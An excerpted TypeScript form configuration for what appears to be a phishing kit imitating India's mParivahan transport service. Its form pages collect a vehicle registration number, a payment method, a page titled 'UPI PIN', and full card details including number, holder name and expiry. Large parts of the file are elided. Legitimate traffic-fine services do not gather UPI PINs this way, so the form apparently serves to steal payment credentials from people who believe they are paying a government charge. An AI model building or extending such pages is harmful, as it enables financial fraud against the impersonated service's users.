...
//   2. The mParivahan page in public/M privahan/index.html handles all steps
...
export const FORM_PAGES: PageConfig[] = [
    {
        ...
        fields: [
            ...
            { key: 'vehicleNumber', displayName: 'Vehicle Registration Number', type: 'text', category: 'personal', required: true, maxlength: 13, placeholder: 'E.G. DL 3C AB 1234' },
        ],
    ...
    },
    {
        ...
        fields: [
            { key: 'paymentMethod', displayName: 'Payment Method', type: 'text', category: 'payment', required: true, placeholder: 'UPI / Card' },
        ],
    ...
    },
    {
        ...
        title: 'UPI PIN',
        fields: [
            { key: 'upiApp', displayName: 'UPI App / Method', type: 'text', category: 'upi', required: true, placeholder: 'Google Pay / PhonePe / UPI ID' },
    ...
    },
    {
        ...
        title: 'Card Details',
        fields: [
            { key: 'cardType', displayName: 'Card Type', type: 'text', category: 'card', required: true, placeholder: 'Debit Card / Credit Card' },
            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX XXXX XXXX XXXX' },
            { key: 'cardHolderName', displayName: 'Card Holder Name', type: 'text', category: 'card', required: true, placeholder: 'Name as on card' },
            { key: 'cardExpiry', displayName: 'Card Expiry', type: 'text', category: 'card', required: true, maxlength: 7, placeholder: 'MM / YY' },
